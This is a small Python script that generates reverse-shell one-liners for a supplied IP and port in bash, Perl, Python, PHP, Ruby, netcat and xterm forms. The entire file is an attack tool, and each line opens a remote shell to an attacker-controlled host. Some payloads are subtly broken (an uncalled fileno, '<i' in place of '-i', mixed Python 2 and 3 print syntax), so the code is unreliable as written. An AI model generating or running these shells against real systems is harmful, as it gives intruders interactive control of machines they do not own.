#!/usr/bin/python

import sys

if len(sys.argv) != 3:
    print("Usage: ./shell-gen.py IP PORT")
else:
    ip = str(sys.argv[1])
    port = sys.argv[2]
    print ("\033[1;32m[*]Generating reverse shells for IP: " + ip + " on port " + port)

    bash = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
    perlLong = """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
    python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
    php = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
    ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
    nc = """nc -e /bin/sh """+ip+""" """+port
    nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
    xterm = """xterm -display """+ip+""":"""+port

    print "\033[1;31m[*]BASH\033[1;m\n" + bash + "\n"
    print "\033[1;31m[*]PERL\033[1;m\n" + perlLong + "\n"
    print "\033[1;31m[*]PYTHON\033[1;m\n" + python + "\n"
    print "\033[1;31m[*]PHP\033[1;m\n" + php + "\n"
    print "\033[1;31m[*]RUBY\033[1;m\n" + ruby + "\n"
    print "\033[1;31m[*]NETCAT\033[1;m\n" + nc + "\n"
    print "\033[1;31m[*]NETCAT WITH MKFIFO\033[1;m\n" + nc2 + "\n"
    print "\033[1;31m[*]XTERM\033[1;m\n" + xterm + "\n"
